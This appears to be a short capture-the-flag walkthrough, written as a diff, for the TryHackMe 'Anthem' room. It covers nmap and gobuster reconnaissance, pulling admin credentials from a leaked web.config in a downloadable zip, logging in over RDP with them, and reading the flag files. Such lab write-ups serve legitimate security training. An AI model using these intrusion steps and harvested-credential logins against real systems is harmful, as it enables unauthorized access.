@@ -1,0 +1,72 @@
+----------------                               ------------------
+               :::::::::::;| ANTHEM |;::::::::::::
+
+
+1) FIRST WE HAVE TO ACCES THE TRYHACKME FROM OPENVPN.
+2) WE HAVE TO JOIN THE ROOM "ANTHEM".
+ 
+TASK - 1 (RECON)
+
+1. SCAN THE MACHNE.
+
+    namp -Pn <ip>
+
+    nmap -A -T 5 <ip> -vv
+
+"it's a Windows machine".
+
+2. How many ports are open?
+ANS: 3 ports (80/HTTP, 3389/RDP, 5985/WinRM)
+
+3. What's on port 80?
+ANS: ASP.NET site with "Anthem" header!
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (WEB EXPLOIT)
+
+1. FIND HIDDEN FILES.
+
+    gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt
+    "FOUND /bin/ directory - JACKPOT!"
+
+2. CHECK /bin/.
+
+    http://<ip>/bin/
+    "Found Anthem.zip - DOWNLOAD IT!"
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (CRACKING)
+
+1. EXTRACT ZIP.
+
+    unzip Anthem.zip
+    "Got web.config with creds: admin:Summer2022"
+
+2. LOGIN TO RDP.
+
+    xfreerdp /v:<ip> /u:admin /p:Summer2022
+    "WE'RE IN THE WINDOWS DESKTOP!"
+
+----------TASK 3 COMPLETED-----------
+
+TASK-4 (PRIV ESC)
+
+1. CHECK USER PRIVS.
+
+    whoami /all
+    "We're already admin! No escalation needed!"
+
+2. FIND FLAGS.
+
+    dir C:\ /s /b | find "flag"
+    "Found flags in Desktop and Documents!"
+
+FLAGS:
+    type C:\Users\admin\Desktop\user.txt
+    type C:\Users\admin\Documents\root.txt
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- ANTHEM OWNED ----------
